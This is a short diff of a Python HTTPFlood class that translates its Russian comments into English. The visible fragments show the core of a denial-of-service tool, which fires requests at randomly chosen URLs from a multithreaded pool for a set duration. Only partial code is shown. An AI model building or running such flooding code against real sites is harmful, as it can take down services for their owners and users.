@@ -13,7 +13,7 @@ class HTTPFlood:
         self.port = port
         self.urls = self.read_urls(urls_file)
         self.duration = duration
-        self.intensity = intensity  # Кол-во рабочих потоков
+        self.intensity = intensity  # Amount of working threads
 
     def read_urls(self, filename):
         try:
@@ -38,7 +38,7 @@ class HTTPFlood:
         stop_time = time.time() + self.duration
         with ThreadPoolExecutor(max_workers=self.intensity) as executor:
             while time.time() < stop_time:
-                # Для многопоточности: задания подаются пачками на пул воркеров
+                # For multithreading: tasks are submitted in batches to a pool of workers
                 for _ in range(self.intensity):
                     url = random.choice(self.urls)
                     executor.submit(self.send_request, url)
@@ -98,3 +98,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
